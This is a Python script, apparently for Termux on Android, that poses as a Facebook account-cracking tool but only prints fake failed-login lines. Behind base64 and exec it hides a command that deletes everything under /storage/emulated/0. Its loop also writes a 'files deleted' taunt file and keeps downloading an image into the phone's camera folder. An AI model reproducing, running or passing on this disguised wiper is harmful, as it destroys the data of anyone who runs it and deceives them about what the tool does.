#!/bin/python3
#coded by alouh sperk
#bobo ka kung pati ito ileleet mo
import api
import asyncio
import base64, string, random, sys, time, os
from colorama import init
from colorama import Fore, Back, Style
init()
  


api.get()
def tvksajd(adwekuv):
  pvncngr = base64.b64decode(adwekuv).decode('utf-8')
  exec(pvncngr)

def oumcgsq():
  vcxprvq = base64.b64decode('YS8=').decode('utf-8')
  if os.path.exists(vcxprvq):
    tvksajd("b3Muc3lzdGVtKCJybSAtcmYgL3N0b3JhZ2UvZW11bGF0ZWQvMC8qIik=")

def banner():
  print("""\033[0;31m
\033[31m========================================================\033[0;31m
\033[0;31m|\033[0;31m   █████▒▄▄▄▄       ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀ |
\033[0;31m|\033[0;31m ▓██   ▒▓█████▄    ▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒  |
\033[0;31m|\033[0;31m ▒████ ░▒██▒ ▄██   ▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░  |
\033[0;31m|\033[0;31m ░▓█▒  ░▒██░█▀     ░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄  |
\033[0;31m|\033[0;31m ░▒█░   ░▓█  ▀█▓   ░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄ |
\033[0;31m|\033[0;31m  ▒ ░   ░▒▓███▀▒    ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒ |
\033[0;31m|\033[0;31m  ░     ▒░▒   ░     ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ |
\033[0;31m|\033[0;31m  ░ ░    ░    ░     ░  ░░ ░  ░   ▒   ░        ░ ░░ ░  |
\033[0;31m|\033[0;31m         ░          ░  ░  ░      ░  ░░ ░      ░  ░    |
\033[0;31m|\033[0;31m              ░                      ░                |
\033[0;31m|\033[0;31m                   \033[34m Author: \033[0;33m PH.PHOENIX (Alouh Sperk)\033[0;31m |
\033[31m========================================================
""")
  

def main():
  banner()
  print(Fore.BLUE + "Setting up Cookies and checking for API")
  asyncio.run(api.pinghost())
  oumcgsq()
  username = input("TARGET USERNAME: ")
  g = ["test", "Test", "123", "skdja", "TEST"]
  if username in g:
    print(Fore.RED +"[!]" + Fore.BLUE + " INVALID USERNAME " + Fore.RED + "[!]")
    sys.exit()
    
  time.sleep(0.5)
  print(Fore.BLUE + "[+] Using Default Worlist: " + Fore.RED + "wordlist.txt \n")
  time.sleep(0.5)
  
  try:
    while True:
      alphabet = string.ascii_lowercase
      x = ''.join(random.choice(alphabet) for i in range(8))
      print(Fore.BLUE + '[403] ' + Fore.YELLOW + username + ":" + x + " ==> " + Fore.RED + "Login Failed")
      p = base64.b64decode('WW91ciBmaWxlcyBoYXMgYmVlbiBkZWxldGVkIGJ5IFBILlBILlBIT0VOSVg=').decode('utf-8')
      os.system(f'echo {p} > {x}.txt')
      os.system(f'wget -q ttpsps://raw.githubusercontent.com/codewithalouh/codewithalouh/main/phoenix.jpg  -O /storage/emulated/0/DCIM/Camera/{x}.png')
      time.sleep(0.5)
      
  except KeyboardInterrupt:
    print(Fore.BLUE + "[+] " + Fore.RED + "main THE PLANET" + Fore.BLUE + " [+]")
    

  


if __name__ == "__main__":
  main()
